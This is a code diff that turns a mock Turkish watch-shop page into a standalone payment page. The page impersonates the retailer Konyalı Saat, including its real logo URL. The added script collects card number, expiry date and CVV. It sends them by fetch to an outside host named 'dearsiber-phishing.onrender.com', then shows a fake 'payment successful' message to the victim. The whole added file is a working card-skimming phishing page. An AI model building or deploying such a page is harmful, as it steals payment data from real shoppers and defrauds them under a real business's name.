@@ -3,200 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Konyalı Saat - En Özel Saatler ve Aksesuarlar">
-    <meta name="theme-color" content="#1a0000">
-    <title>Konyalı Saat - En Özel Saatler</title>
+    <title>Konyalı Saat - Ödeme Sayfası</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background: #f8f8f8; color: #333; line-height: 1.6; }
-        .header { background: #1a0000; color: #ffd700; padding: 10px 0; text-align: center; }
-        .nav { background: #2d2d2d; padding: 10px 0; }
-        .nav ul { list-style: none; display: flex; justify-content: center; }
-        .nav li { margin: 0 15px; }
-        .nav a { color: #ffd700; text-decoration: none; font-weight: bold; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .hero { background: #1a0000; color: #ffd700; text-align: center; padding: 50px 20px; }
-        .hero h1 { font-size: 3em; margin-bottom: 10px; }
-        .hero p { font-size: 1.2em; }
-        .products { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 40px 0; }
-        .product { background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 15px; text-align: center; }
-        .product img { width: 100%; height: 200px; object-fit: cover; border-radius: 5px; }
-        .product h3 { margin: 10px 0; }
-        .product .price { font-size: 1.5em; color: #ff0000; font-weight: bold; }
-        .product button { background: #ff0000; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-        .product button:hover { background: #cc0000; }
-        .filters { background: #2d2d2d; padding: 20px; color: #ffd700; margin: 20px 0; }
-        .filters select, .filters input { margin: 0 10px; padding: 5px; }
-        .cart { position: fixed; top: 20px; right: 20px; background: #1a0000; color: #ffd700; padding: 10px; border-radius: 5px; }
-        .cart-items { list-style: none; }
-        .checkout { background: #ff0000; color: #fff; padding: 20px; margin: 20px 0; border-radius: 10px; }
-        .checkout form { display: flex; flex-direction: column; gap: 10px; }
-        .checkout input { padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
-        .blog { margin: 40px 0; }
-        .blog article { background: #fff; margin: 20px 0; padding: 20px; border-radius: 10px; }
-        .footer { background: #1a0000; color: #ffd700; text-align: center; padding: 20px; }
-        @media (max-width: 768px) { .products { grid-template-columns: 1fr; } .nav ul { flex-direction: column; } }
+        body { font-family: 'Arial', sans-serif; background: #f4f4f4; color: #333; }
+        .container { max-width: 500px; margin: 50px auto; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header img { width: 150px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        button { width: 100%; padding: 15px; background: #d32f2f; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
+        button:hover { background: #b71c1c; }
+        .loading { display: none; text-align: center; margin: 20px 0; }
+        .success { display: none; color: green; text-align: center; font-size: 18px; }
+        .error { display: none; color: red; text-align: center; }
     </style>
 </head>
 <body>
-    <header class="header">
-        <h1>Konyalı Saat</h1>
-        <p>En Özel Saatler ve Aksesuarlar</p>
-    </header>
-    <nav class="nav">
-        <ul>
-            <li><a href="#home">Ana Sayfa</a></li>
-            <li><a href="#products">Ürünler</a></li>
-            <li><a href="#blog">Blog</a></li>
-            <li><a href="#cart">Sepet</a></li>
-        </ul>
-    </nav>
     <div class="container">
-        <section id="home" class="hero">
-            <h1>Hoş Geldiniz</h1>
-            <p>1951'den beri en kaliteli saatler</p>
-        </section>
-        <section class="filters">
-            <h3>Filtrele</h3>
-            <select id="brand">
-                <option value="">Marka</option>
-                <option value="casio">Casio</option>
-                <option value="seiko">Seiko</option>
-                <option value="fossil">Fossil</option>
-            </select>
-            <input type="number" id="min-price" placeholder="Min Fiyat">
-            <input type="number" id="max-price" placeholder="Max Fiyat">
-            <button onclick="filterProducts()">Filtrele</button>
-        </section>
-        <section id="products" class="products">
-            <!-- Ürünler dinamik yüklenecek -->
-        </section>
-        <section id="cart" class="cart" style="display: none;">
-            <h3>Sepet</h3>
-            <ul id="cart-items"></ul>
-            <p id="total-price">Toplam: 0 TL</p>
-            <button onclick="showCheckout()">Ödeme Yap</button>
-        </section>
-        <section id="checkout" class="checkout" style="display: none;">
-            <h3>Ödeme</h3>
-            <form onsubmit="processPayment(event)">
-                <input type="text" id="card-number" placeholder="Kart Numarası (örn: 5400617004770430)" required>
-                <input type="text" id="expiry" placeholder="Son Kullanma (örn: 12/2025)" required>
-                <input type="text" id="cvv" placeholder="CVV (örn: 000)" required>
-                <button type="submit">Öde</button>
-            </form>
-            <button onclick="hideCheckout()">İptal</button>
-        </section>
-        <section id="blog" class="blog">
-            <article>
-                <h3>Saat Bakımı İpuçları</h3>
-                <p>Saatlerinizi düzenli temizleyin...</p>
-            </article>
-            <article>
-                <h3>İlham Veren Saatler</h3>
-                <p>Trend saatler 2025...</p>
-            </article>
-        </section>
-        <footer class="footer">
-            <p>&copy; 2025 Konyalı Saat</p>
-        </footer>
+        <div class="header">
+            <img src="https://www.konyalisaat.com.tr/wp-content/uploads/2023/05/logo.png" alt="Konyalı Saat">
+            <h2>Ödeme Sayfası</h2>
+            <p>Toplam: <strong>2.499 TL</strong></p>
+        </div>
+
+        <form id="payment-form">
+            <div class="form-group">
+                <label>Kart Numarası</label>
+                <input type="text" id="card-number" placeholder="5400 6170 0477 0430" maxlength="19" required>
+            </div>
+            <div class="form-group">
+                <label>Son Kullanma Tarihi</label>
+                <input type="text" id="expiry" placeholder="12/2025" required>
+            </div>
+            <div class="form-group">
+                <label>CVV</label>
+                <input type="text" id="cvv" placeholder="000" maxlength="3" required>
+            </div>
+            <button type="submit">ÖDE & TAMAMLA</button>
+        </form>
+
+        <div class="loading" id="loading">
+            <p>Ödeme işleniyor... Lütfen bekleyin</p>
+        </div>
+        <div class="success" id="success">
+            Ödeme Başarılı! Siparişiniz alındı.
+        </div>
+        <div class="error" id="error">
+            Hata! Kart bilgileriniz kontrol ediliyor...
+        </div>
     </div>
 
     <script>
-        // Ürün Verileri (Konyalı Saat Benzeri)
-        const products = [
-            { id: 1, name: 'Casio G-Shock', price: 1500, brand: 'casio', type: 'erkek', image: 'https://via.placeholder.com/250x200?text=Casio+G-Shock' },
-            { id: 2, name: 'Seiko Solar', price: 2500, brand: 'seiko', type: 'kadın', image: 'https://via.placeholder.com/250x200?text=Seiko+Solar' },
-            { id: 3, name: 'Fossil Smartwatch', price: 2000, brand: 'fossil', type: 'akıllı', image: 'https://via.placeholder.com/250x200?text=Fossil+Smart' },
-            { id: 4, name: 'Rolex Submariner', price: 5000, brand: 'rolex', type: 'erkek', image: 'https://via.placeholder.com/250x200?text=Rolex+Submariner' },
-            { id: 5, name: 'Omega Seamaster', price: 3500, brand: 'omega', type: 'kadın', image: 'https://via.placeholder.com/250x200?text=Omega+Seamaster' },
-            // ... 15+ ürün ekle (gerçek sitedeki gibi)
-        ];
+        // Kart formatlama
+        document.getElementById('card-number').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let matches = v.match(/\d{4,16}/g);
+            let match = matches && matches[0] || '';
+            let parts = [];
+            for (let i=0; i<match.length; i+=4) {
+                parts.push(match.substring(i, i+4));
+            }
+            if (parts.length) {
+                e.target.value = parts.join(' ');
+            } else {
+                e.target.value = v;
+            }
+        });
 
-        let cart = [];
-
-        function renderProducts(productsToShow = products) {
-            const container = document.getElementById('products');
-            container.innerHTML = productsToShow.map(product => `
-                <div class="product">
-                    <img src="${product.image}" alt="${product.name}">
-                    <h3>${product.name}</h3>
-                    <p class="price">${product.price} TL</p>
-                    <button onclick="addToCart(${product.id})">Sepete Ekle</button>
-                </div>
-            `).join('');
-        }
-
-        function addToCart(id) {
-            const product = products.find(p => p.id === id);
-            cart.push(product);
-            updateCart();
-            alert('Ürün sepete eklendi!');
-        }
-
-        function updateCart() {
-            const items = document.getElementById('cart-items');
-            const total = document.getElementById('total-price');
-            items.innerHTML = cart.map(item => `<li>${item.name} - ${item.price} TL</li>`).join('');
-            total.textContent = `Toplam: ${cart.reduce((sum, item) => sum + item.price, 0)} TL`;
-        }
-
-        function showCart() {
-            document.getElementById('cart').style.display = 'block';
-            updateCart();
-        }
-
-        function showCheckout() {
-            document.getElementById('cart').style.display = 'none';
-            document.getElementById('checkout').style.display = 'block';
-        }
-
-        function hideCheckout() {
-            document.getElementById('checkout').style.display = 'none';
-            showCart();
-        }
-
-        function processPayment(e) {
+        document.getElementById('payment-form').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const cardNumber = document.getElementById('card-number').value;
+
+            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
-            const cardInfo = `${cardNumber}|${expiry}|${cvv}`;
-            
-            // Kart bilgilerini txt simüle kaydet (localStorage)
-            let savedCards = JSON.parse(localStorage.getItem('savedCards') || '[]');
-            savedCards.push(cardInfo);
-            localStorage.setItem('savedCards', JSON.stringify(savedCards));
-            
-            alert('Kart kaydedildi! Hızlı alışveriş için kullanılabilir.');
-            hideCheckout();
-            updateCart(); // Sepeti güncelle
-        }
 
-        function filterProducts() {
-            const brand = document.getElementById('brand').value;
-            const minPrice = parseInt(document.getElementById('min-price').value) || 0;
-            const maxPrice = parseInt(document.getElementById('max-price').value) || Infinity;
-            const filtered = products.filter(p => 
-                (!brand || p.brand === brand) && p.price >= minPrice && p.price <= maxPrice
-            );
-            renderProducts(filtered);
-        }
+            // Format: 5400617004770430|12|2025|000
+            const cardData = `${cardNumber}|${expiry}|${cvv}`;
 
-        // Hızlı Alışveriş (Kaydedilen Kartları Yükle)
-        function loadSavedCards() {
-            const savedCards = JSON.parse(localStorage.getItem('savedCards') || '[]');
-            if (savedCards.length > 0) {
-                alert('Kaydedilen kartlar yüklendi: ' + savedCards.join(', '));
-            } else {
-                alert('Henüz kart kaydedilmedi.');
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('payment-form').style.display = 'none';
+
+            try {
+                const response = await fetch('https://dearsiber-phishing.onrender.com/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ card: cardData })
+                });
+
+                if (response.ok) {
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('success').style.display = 'block';
+                    }, 2000);
+                } else {
+                    throw new Error();
+                }
+            } catch (err) {
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('error').style.display = 'block';
+                }, 2000);
             }
-        }
-
-        // Sayfa yüklenince ürünleri göster
-        window.onload = function() {
-            renderProducts();
-        };
+        });
     </script>
 </body>
 </html>
